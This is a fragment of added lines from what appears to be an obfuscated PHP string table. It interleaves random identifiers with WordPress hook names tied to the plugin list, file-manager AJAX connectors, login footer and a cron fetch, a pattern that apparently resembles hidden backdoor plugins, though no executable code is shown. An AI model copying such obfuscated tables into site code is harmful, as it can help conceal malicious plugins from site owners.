+[1937] c2vny4i3nojc1ff8
+[1938] views_users
+[1939] du8_lt9gb77n8wxoispa
+[1940] debug_information
+[1941] hd73f_c2fh73m5p
+[1942] show_advanced_plugins
+[1943] xlyo10127ml2hrey
+[1944] admin_head-plugins.php
+[1945] rdkyou14lonsd2z
+[1946] site_transient_update_plugins
+[1947] all_plugins
+[1948] wp_ajax_mk_file_folder_manager
+[1949] zame3pxtml036jchvh
+[1950] wp_ajax_connector
+[1951] wp_ajax_fs_connector
+[1952] wp_footer
+[1953] nveh5_jvwb6xgsjsay
+[1954] template_redirect
+[1955] qzmm1iiqxo5zhe4
+[1956] l38f6iwro8qv249wvny
+[1957] admin_footer
+[1958] db5_06aysjjs5f46f_vfem
+[1959] login_footer
+[1960] plugins_loaded
+[1961] s5gxhrk09kuzrstm
+[1962] plugins_loaded
+[1963] e84voh9pw3kmwl2h9
+[1964] plugins_loaded
+[1965] uig9eu5xexgery0logv
+[1966] f6y5z1r4ne9m_5bir5
+[1967] vybgo2famg4ee7nuwry0fz
+[1968] q16aeynys1mt3po
+[1969] plugins_loaded
+[1970] lkzp1aqg9ldx_khcmqd
+[1971] euaqlrco56fn9oxt0cc1
+[1972] plugins_loaded
+[1973] jlod_r_jaobmww5_bu
+[1974] i8jxsbnmyekajvdghz
+[1975] after_switch_theme
+[1976] qd40nqnvzyzj7xyi_gcat
+[1977] g361av0ok24v0_nm4k
+[1978] register_shutdown_function
+[1979] kswkrcbys4fx3qp2_g6qn7
+[1980] ckag6hpth5xci9f1yl3wqh
+[1981] z9_l272omgh7vi0481
+[1982] sc_last_recovery_check
+[1983] sc_last_recovery_check
+[1984] sc_cron_fetch
+[1985] f6neh0pfbuv59_zas3sf10
+[1986] cron_schedules
+[1987] wu3b4c5fw9yfdptr3b9
+[1988] did_action
